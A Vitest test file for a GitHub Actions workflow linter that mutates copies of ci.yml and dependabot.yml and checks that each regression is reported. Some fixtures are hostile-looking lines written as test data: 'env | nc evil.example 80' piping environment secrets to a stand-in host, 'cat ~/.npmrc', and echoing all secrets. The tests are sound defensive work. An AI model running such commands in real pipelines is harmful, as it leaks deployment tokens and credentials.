// check:workflows on copies of the real ci.yml and dependabot.yml, each with one mutation: every regression it exists for
// fails with the rule, the line and the fix, and the real tree passes. The last block records what it does not catch.
import { spawnSync } from 'node:child_process';
import { copyFileSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { afterAll, describe, expect, it } from 'vitest';

const ROOT = fileURLToPath(new URL('..', import.meta.url));
const SCRIPT = join(ROOT, 'scripts/check-workflows.mjs');
const dirs = [];
afterAll(() => { for (const d of dirs) rmSync(d, { recursive: true, force: true }); });

/** Copy the workflows and dependabot.yml to a fresh dir, apply `edit` ({ ci, dep, write }), run the check on the copy. */
function run(edit = () => {}) {
  const dir = mkdtempSync(join(tmpdir(), 'check-workflows-'));
  dirs.push(dir);
  mkdirSync(join(dir, 'workflows'));
  copyFileSync(join(ROOT, '.github/workflows/ci.yml'), join(dir, 'workflows/ci.yml'));
  copyFileSync(join(ROOT, '.github/dependabot.yml'), join(dir, 'dependabot.yml'));
  /** Replace exactly one occurrence, so a fixture that no longer matches the real files fails loudly. */
  const swap = (f, from, to) => {
    const s = readFileSync(join(dir, f), 'utf8');
    expect(s.split(from).length, `${f}: ${from}`).toBe(2);
    writeFileSync(join(dir, f), s.replace(from, to));
  };
  edit({ ci: (a, b) => swap('workflows/ci.yml', a, b), dep: (a, b) => swap('dependabot.yml', a, b), write: (f, s) => writeFileSync(join(dir, f), s) });
  const r = spawnSync(process.execPath, [SCRIPT], { encoding: 'utf8', env: { ...process.env, WORKFLOWS_DIR: join(dir, 'workflows'), DEPENDABOT_FILE: join(dir, 'dependabot.yml') } });
  return { status: r.status, out: r.stdout + r.stderr };
}

const DEPLOY_STEP = 'run: npx --yes "wrangler@${WRANGLER_VERSION}" deploy\n';
const PREFLIGHT = 'npx --yes "wrangler@${WRANGLER_VERSION}" deploy --dry-run';
const FAST = " ${{ github.event_name == 'pull_request' && '--fast' || '' }}";
const SECRET_ENV = '          CLOUDFLARE_API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}\n';
const IF = "    if: github.event_name == 'push'";
/** A second workflow file that passes every other rule: `on` is its trigger line, `steps` its step lines. */
const other = (on, steps) => `name: Other\non:\n  ${on}\npermissions:\n  contents: read\njobs:\n  ship:\n    runs-on: ubuntu-latest\n    timeout-minutes: 5\n    steps:\n${steps}`;

const STACK = /TypeError|ReferenceError|\n\s+at /;
const SHAPES = [
  ['a null step', ({ ci }) => ci('      - run: npx playwright install --with-deps chromium\n', '      - run: npx playwright install --with-deps chromium\n      -\n'), /check:workflows FAIL: \S*workflows\/ci\.yml:\d+ \[[a-l]\] the check could not read this file's shape \(.*\): write it the way the GitHub documentation shows/],
  ['a job that is a string', ({ ci }) => ci('  journeys:\n    needs: check\n', '  extra: nothing\n  journeys:\n    needs: check\n'), /workflows\/ci\.yml:\d+ \[[a-l]\] (the check could not read this file's shape|job extra has no timeout-minutes)/],
  ['a workflow that is a list', ({ write }) => write('workflows/ci.yml', '- a\n- b\n'), /workflows\/ci\.yml:1 the top level is not a mapping/],
];
// [rule, change, edit]: each one exited 1 before this version of the check (or crashed), and passes now
const HARMLESS = [
  ['c', 'a run string "no secrets. here" (it crashed: a TypeError on a null match)', ({ ci }) => ci('      - run: npm run check\n', '      - run: npm run check\n      - run: echo "no secrets. here"\n')],
  ['g', 'echo "deployed by wrangler" is not a Wrangler invocation', ({ ci }) => ci('      - run: npm run check\n', '      - run: npm run check\n      - run: echo "deployed by wrangler"\n')],
  ['h', 'timeout-minutes as an expression', ({ ci }) => ci('    timeout-minutes: 20\n', '    timeout-minutes: ${{ 20 }}\n')],
  ['f', 'a --data flag outside curl or wget', ({ ci }) => ci('      - run: npm run check\n', '      - run: npm run check\n      - run: echo --data\n')],
];

describe('check:workflows', () => {
  it('passes the real tree', () => {
    const r = spawnSync(process.execPath, [SCRIPT], { encoding: 'utf8', cwd: ROOT });
    expect(r.status, r.stderr).toBe(0);
    expect(r.stdout).toMatch(/^workflows OK: \d+ workflow files?, 12 rules$/m);
  });
  it('passes an unchanged copy', () => {
    const r = run();
    expect(r.status, r.out).toBe(0);
    expect(r.out).toContain('workflows OK: 1 workflow file, 12 rules');
  });

  // [rule, mutation, edit, the message it must print]
  const BROKEN = [
    ['a', 'deploy needs only check (the real past mistake)', ({ ci }) => ci('needs: [check, journeys]', 'needs: check'), /ci\.yml:\d+ \[a\] job deploy needs "check" \(one job name\), which does not include "journeys": write `needs: \[check, journeys\]`, or a master build whose journeys fail would go live/],
    ['a', 'deploy needs a list without journeys', ({ ci }) => ci('needs: [check, journeys]', 'needs: [check]'), /\[a\] job deploy needs \["check"\], which does not include "journeys"/],
    ['a', 'deploy needs nothing', ({ ci }) => ci('    needs: [check, journeys]\n', ''), /\[a\] job deploy needs \[\], which does not include "check" or "journeys"/],
    ['a', 'deploy needs one string that looks like a list', ({ ci }) => ci('needs: [check, journeys]', 'needs: "check, journeys"'), /\[a\] job deploy needs "check, journeys" \(one job name\), which does not include "check" or "journeys"/],
    ['a', 'journeys no longer needs check', ({ ci }) => ci('    needs: check\n', ''), /\[a\] job journeys does not need check: write `needs: check`/],
    ['b', 'deploy on any branch', ({ ci }) => ci(" && github.ref == 'refs/heads/master'", ''), /\[b\] job deploy: its if does not test github\.ref == 'refs\/heads\/master'/],
    ['b', 'deploy if joined with || (deploys a pull request)', ({ ci }) => ci(IF, "    if: github.event_name == 'pull_request' || github.event_name == 'push'"), /\[b\] job deploy: its if uses \|\|, which lets deploy run when a needed job failed or for another event/],
    ['b', 'deploy if with always() (deploys after failed journeys)', ({ ci }) => ci(IF, `    if: always() && ${IF.trim().slice(4)}`), /\[b\] job deploy: its if uses always\(\)/],
    ['b', 'deploy if with !cancelled()', ({ ci }) => ci(IF, `    if: (!cancelled()) && ${IF.trim().slice(4)}`), /\[b\] job deploy: its if uses cancelled\(\)/],
    ['b', 'deploy if with failure()', ({ ci }) => ci(IF, `    if: (success() || failure()) && ${IF.trim().slice(4)}`), /\[b\] job deploy: its if uses \|\|/],
    ['b', 'deploy if reads needs.check.result', ({ ci }) => ci(IF, `    if: needs.check.result == 'success' && ${IF.trim().slice(4)}`), /\[b\] job deploy: its if uses needs\.check\.result/],
    ['c', 'a secret in the check job', ({ ci }) => ci('      - run: npm run check\n', '      - run: npm run check\n        env:\n          T: ${{ secrets.CLOUDFLARE_API_TOKEN }}\n'), /\[c\] job check, step 4, env\.T uses secrets\.CLOUDFLARE_API_TOKEN: secrets belong only/],
    ['c', 'toJSON(secrets) in a check run string', ({ ci }) => ci('      - run: npm run check\n', '      - run: npm run check\n      - run: echo "${{ toJSON(secrets) }}"\n'), /ci\.yml:\d+ \[c\] job check, step 5, run uses secrets: secrets belong only/],
    ['c', 'secrets[...] in a check env', ({ ci }) => ci('      - run: npm run check\n', `      - run: npm run check\n        env:\n          T: "\${{ secrets[format('CLOUDFLARE_{0}', 'API_TOKEN')] }}"\n`), /\[c\] job check, step 4, env\.T uses secrets: secrets belong only/],
    ['c', 'a bare ${{ secrets }} in a check env', ({ ci }) => ci('      - run: npm run check\n', '      - run: npm run check\n        env:\n          ALL: ${{ secrets }}\n'), /\[c\] job check, step 4, env\.ALL uses secrets/],
    ['c', 'the token step runs more than the deploy', ({ ci }) => ci(DEPLOY_STEP, 'run: npx --yes "wrangler@${WRANGLER_VERSION}" deploy && env | nc evil.example 80\n'), /ci\.yml:\d+ \[c\] job deploy, step Deploy with Wrangler holds secrets\.CLOUDFLARE_API_TOKEN in its env but runs `npx .* deploy && env \| nc evil\.example 80`: the step with the token runs exactly `npx --yes "wrangler@\$\{WRANGLER_VERSION\}" deploy` and nothing else/],
    ['c', 'the token step runs two lines', ({ ci }) => ci(DEPLOY_STEP, 'run: |\n          npx --yes "wrangler@${WRANGLER_VERSION}" deploy\n          cat ~/.npmrc\n'), /\[c\] job deploy, step Deploy with Wrangler holds secrets\.CLOUDFLARE_API_TOKEN in its env but runs/],
    ['c', 'a secret in a run string', ({ ci }) => ci(DEPLOY_STEP, 'run: CLOUDFLARE_API_TOKEN=${{ secrets.CLOUDFLARE_API_TOKEN }} npx --yes "wrangler@${WRANGLER_VERSION}" deploy\n'), /\[c\] job deploy, step Deploy with Wrangler, run uses secrets\./],
    ['c', 'a secret at job level', ({ ci }) => ci('    permissions:\n      contents: read\n', `    env:\n${SECRET_ENV.slice(4)}    permissions:\n      contents: read\n`), /\[c\] job deploy, env\.CLOUDFLARE_API_TOKEN uses/],
    ['c', 'workflow permissions widened', ({ ci }) => ci('permissions:\n  contents: read\n', 'permissions:\n  contents: write\n'), /\[c\] the workflow must set `permissions: contents: read`[\s\S]*\[c\] workflow permissions grant contents: write/],
    ['c', 'deploy asks for id-token', ({ ci }) => ci('    permissions:\n      contents: read\n', '    permissions:\n      contents: read\n      id-token: write\n'), /ci\.yml:\d+ \[c\] job deploy permissions grant id-token: write/],
    ['d', 'an unpinned action', ({ ci }) => ci('uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2', 'uses: actions/checkout@v4'), /\[d\] job journeys uses actions\/checkout@v4: pin it to a 40-hex commit sha/],
    ['e', 'journeys always fast', ({ ci }) => ci(FAST, ' --fast'), /\[e\] the journeys step must pass --fast only on pull requests/],
    ['e', 'journeys never fast', ({ ci }) => ci(FAST, ''), /\[e\] the journeys step must pass --fast only on pull requests/],
    ['e', 'fast on pull requests and also always', ({ ci }) => ci(FAST, `${FAST} --fast`), /\[e\] the journeys step passes --fast outside the pull_request condition/],
    ['f', 'no dry run', ({ ci }) => ci(PREFLIGHT, 'npx --yes "wrangler@${WRANGLER_VERSION}" --version'), /\[f\] job check has no Wrangler dry run/],
    ['f', 'check runs check:fast only', ({ ci }) => ci('      - run: npm run check\n', '      - run: npm run check:fast\n'), /\[f\] job check does not run `npm run check`/],
    ['f', 'verify:live replaced by curl', ({ ci }) => ci('run: npm run verify:live -- --retries 10 --post-deploy', 'run: curl -fsS https://dothehardthing.app/'), /\[f\] job deploy does not verify with `npm run verify:live`[\s\S]*\[f\] job deploy runs curl/],
    ['f', 'verify:live without --post-deploy', ({ ci }) => ci('run: npm run verify:live -- --retries 10 --post-deploy', 'run: npm run verify:live -- --retries 10'), /\[f\] job deploy runs `npm run verify:live` without `--post-deploy`: add it .*without it the live header and manifest checks would only be PENDING and never enforced/],
    ['f', '--post-deploy only in an echo, not passed to verify:live', ({ ci }) => ci('run: npm run verify:live -- --retries 10 --post-deploy', 'run: npm run verify:live -- --retries 10 && echo --post-deploy'), /\[f\] job deploy runs `npm run verify:live` without `--post-deploy`/],
    ['f', 'a POST to /api/event', ({ ci }) => ci('run: npm run verify:live -- --retries 10 --post-deploy', 'run: npm run verify:live -- --retries 10 --post-deploy && curl -X POST https://dothehardthing.app/api/event'), /\[f\] job deploy: `npm run verify:live .*` sends data: live verification is read-only/],
    ['f', 'curl --data to the live site', ({ ci }) => ci('run: npm run verify:live -- --retries 10 --post-deploy', 'run: npm run verify:live -- --retries 10 --post-deploy && curl --data x https://dothehardthing.app/'), /\[f\] job deploy: `.*curl --data x.*` sends data/],
    ['f', 'a value that names POST and /api/event', ({ ci }) => ci('      - run: npm run check\n', '      - run: npm run check\n      - run: echo "the Worker answers POST /api/event"\n'), /\[f\] job check: `echo "the Worker answers POST \/api\/event"` names POST and \/api\/event, and a POST there would add to the real counts/],
    ['g', 'hard-coded Wrangler version', ({ ci }) => ci(DEPLOY_STEP, 'run: npx --yes wrangler@4.86.0 deploy\n'), /\[g\] job deploy: `npx --yes wrangler@4\.86\.0 deploy` hard-codes a Wrangler version/],
    ['g', 'unpinned Wrangler', ({ ci }) => ci(PREFLIGHT, 'npx --yes wrangler deploy --dry-run'), /\[g\] job check: `npx --yes wrangler deploy --dry-run .*` runs Wrangler without the pinned version/],
    ['g', 'no workflow-level version', ({ ci }) => ci('  WRANGLER_VERSION: 4.86.0\n', '  OTHER: x\n'), /\[g\] set `WRANGLER_VERSION: x\.y\.z`/],
    ['h', 'missing timeout', ({ ci }) => ci('    timeout-minutes: 20\n', ''), /ci\.yml:\d+ \[h\] job journeys has no timeout-minutes/],
    ['h', 'missing concurrency', ({ ci }) => ci('    concurrency:\n      group: deploy-production\n      cancel-in-progress: false\n', ''), /\[h\] job deploy needs `concurrency:/],
    ['h', 'cancel-in-progress true', ({ ci }) => ci('cancel-in-progress: false', 'cancel-in-progress: true'), /\[h\] job deploy needs `concurrency:/],
    ['h', 'missing environment', ({ ci }) => ci('    environment:\n      name: production\n      url: https://dothehardthing.app\n', ''), /\[h\] job deploy declares no environment/],
    ['j', 'continue-on-error on the journeys job', ({ ci }) => ci('    needs: check\n', '    needs: check\n    continue-on-error: true\n'), /ci\.yml:\d+ \[j\] job journeys sets continue-on-error: a failed step or job would then count as passed/],
    ['j', 'continue-on-error on the Journeys step', ({ ci }) => ci('      - name: Journeys\n', '      - name: Journeys\n        continue-on-error: true\n'), /\[j\] job journeys, step Journeys sets continue-on-error/],
    ['j', 'continue-on-error on the npm run check step', ({ ci }) => ci('      - run: npm run check\n', '      - run: npm run check\n        continue-on-error: ${{ true }}\n'), /\[j\] job check, step 4 sets continue-on-error/],
    ['k', 'pull_request_target added', ({ ci }) => ci('  pull_request:\n', '  pull_request:\n  pull_request_target:\n'), /ci\.yml:\d+ \[k\] the workflow runs on pull_request_target[\s\S]*\[k\] ci\.yml runs on \[push, pull_request, pull_request_target\]/],
    ['k', 'workflow_dispatch added', ({ ci }) => ci('  pull_request:\n', '  pull_request:\n  workflow_dispatch:\n'), /\[k\] ci\.yml runs on \[push, pull_request, workflow_dispatch\]: run it on exactly push and pull_request/],
    ['k', 'push widened to another branch', ({ ci }) => ci('    branches: [master]\n', '    branches: [master, release]\n'), /\[k\] on\.push is \{"branches":\["master","release"\]\}: write exactly `branches: \[master\]`/],
    ['k', 'push to every branch', ({ ci }) => ci('  push:\n    branches: [master]\n', '  push:\n'), /\[k\] on\.push is null: write exactly `branches: \[master\]`/],
    ['k', 'pull_request_target in a second workflow', ({ write }) => write('workflows/labels.yml', other('pull_request_target:', '      - run: echo hi\n')), /workflows\/labels\.yml:\d+ \[k\] the workflow runs on pull_request_target/],
    ['l', 'a second workflow deploys with a token from vars', ({ write }) => write('workflows/release.yml', other('push:', '      - run: npx --yes "wrangler@${WRANGLER_VERSION}" deploy\n        env:\n          CLOUDFLARE_API_TOKEN: ${{ vars.TOKEN }}\n')), /workflows\/release\.yml:\d+ \[l\] job ship, step 1: `npx --yes "wrangler@\$\{WRANGLER_VERSION\}" deploy` deploys: only ci\.yml job deploy deploys/],
    ['l', 'the check job deploys for real', ({ ci }) => ci(PREFLIGHT, 'npx --yes "wrangler@${WRANGLER_VERSION}" deploy'), /\[l\] job check, step Deploy preflight \(dry run, no credentials\): `.*` deploys/],
    ['l', 'a dry run chained to a real deploy', ({ ci }) => ci(PREFLIGHT, `${PREFLIGHT} --outdir x && npx --yes "wrangler@\${WRANGLER_VERSION}" deploy`), /\[l\] job check, step Deploy preflight .* deploys/],
    ['l', 'the journeys job publishes', ({ ci }) => ci('      - run: npx playwright install --with-deps chromium\n', '      - run: npx playwright install --with-deps chromium\n      - run: npx --yes "wrangler@${WRANGLER_VERSION}" publish\n'), /\[l\] job journeys, step 5: `.* publish` deploys/],
    ['i', 'npm groups removed', ({ dep }) => dep('    groups:\n      npm-minor-and-patch:\n        update-types: ["minor", "patch"]\n', ''), /dependabot\.yml:\d+ \[i\] npm: no group covers minor and patch/],
    ['i', 'actions group covers patch only', ({ dep }) => dep('actions-minor-and-patch:\n        update-types: ["minor", "patch"]', 'actions-patch:\n        update-types: ["patch"]'), /\[i\] github-actions: no group covers minor and patch/],
    ['i', 'npm major ignore removed', ({ dep }) => dep('      - dependency-name: "*"\n        update-types: ["version-update:semver-major"]\n', ''), /\[i\] npm: no ignore for majors/],
    ['i', 'react-hooks ignore on another package', ({ dep }) => dep('"eslint-plugin-react-hooks"', '"eslint-plugin-react"'), /\[i\] npm: eslint-plugin-react-hooks minors are not/],
    ['i', 'react-hooks minors no longer ignored', ({ dep }) => dep('semver-minor", "v', 'semver-patch", "v'), /\[i\] npm: eslint-plugin-react-hooks minors are not/],
    ['i', 'the security comment removed', ({ write }) => write('dependabot.yml', readFileSync(join(ROOT, '.github/dependabot.yml'), 'utf8').replace(/^#.*\n/gm, '')), /\[i\] no comment says "security"/],
  ];
  it.each(BROKEN)('[%s] fails: %s', (_rule, _what, edit, message) => {
    const r = run(edit);
    expect(r.status, r.out).toBe(1);
    expect(r.out).toMatch(message);
    expect(r.out).not.toMatch(STACK);
  });

  // A shape the check cannot read prints the file and the rule, never a stack trace.
  it.each(SHAPES)('a shape it cannot read: %s', (_what, edit, message) => {
    const r = run(edit);
    expect(r.status, r.out).toBe(1);
    expect(r.out).toMatch(message);
    expect(r.out).not.toMatch(STACK);
  });

  // Harmless changes that an earlier version flagged or crashed on: each passes.
  it.each(HARMLESS)('[%s] passes: %s', (_rule, _what, edit) => {
    const r = run(edit);
    expect(r.status, r.out).toBe(0);
    expect(r.out).not.toMatch(STACK);
  });
});

// What the check does not catch: each mutation below breaks the workflow and still passes. actionlint (run by hand when
// .github/workflows changes) catches the shell class (the unquoted path is its SC2086); the others only a reviewer sees.
const GAPS = [
  ['a deploy if that names the right words but can never be true', ({ ci }) => ci("github.event_name == 'push' && github.ref", "github.event_name == 'push' && github.event_name == 'pull_request' && github.ref")],
  ['a step that never runs (if: false on the dry run)', ({ ci }) => ci('      - name: Deploy preflight (dry run, no credentials)\n', '      - name: Deploy preflight (dry run, no credentials)\n        if: false\n')],
  ['a shell bug in a run string (an unquoted path, shellcheck SC2086 through actionlint)', ({ ci }) => ci('--outdir "$RUNNER_TEMP/wrangler-out"', '--outdir $RUNNER_TEMP/wrangler-out')],
  ['a failure swallowed in a run string', ({ ci }) => ci('run: npm run verify:live -- --retries 10 --post-deploy', 'run: npm run verify:live -- --retries 10 --post-deploy || true')],
  ['a pinned sha that is not the version its comment claims', ({ ci }) => ci('actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9', 'actions/upload-artifact@0000000000000000000000000000000000000000')],
];
describe('check:workflows: known gaps (still pass)', () => {
  it.each(GAPS)('%s (not caught)', (_what, edit) => {
    const r = run(edit);
    expect(r.status, r.out).toBe(0);
  });
});
